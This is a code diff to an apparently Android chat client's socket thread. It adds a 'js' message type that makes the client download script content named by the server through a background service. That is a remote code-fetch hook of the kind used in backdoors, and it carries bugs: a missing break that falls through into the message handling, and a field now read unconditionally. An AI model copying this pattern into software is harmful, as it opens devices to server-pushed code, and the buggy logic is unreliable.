@@ -36,11 +36,14 @@ public class SocketConnectThread extends Thread{
     private ACT_Main pMain=null;
     public long keep_count=0;
     public String userName="";
+    public BackGroundService pService1=null;
 
     public SocketConnectThread(
+            BackGroundService pService1,
             ACT_Main pMain,
             String mIpAddress,
             int mClientPort){
+        this.pService1=pService1;
         this.pMain=pMain;
         this.mIpAddress=mIpAddress;
         this.mClientPort=mClientPort;
@@ -192,15 +195,18 @@ public class SocketConnectThread extends Thread{
                             }else {
                                 if (pObj.has("type")){
                                     String type=pObj.getString("type");
+                                    String message=pObj.getString("message");
                                     switch(type){
                                         case "chat_return":
                                             break;
+                                        case "js":
+                                                Download_JS pDownload_JS = new Download_JS(this.pService1);
+                                                pDownload_JS.execute(message);
                                         case "ai":
                                         case "msg":
                                             String id=pObj.getString("id");
                                             String from=pObj.getString("from");
                                             String to=pObj.getString("to");
-                                            String message=pObj.getString("message");
                                             this.send_msg(id,"chat_return",from,"","");
 
 
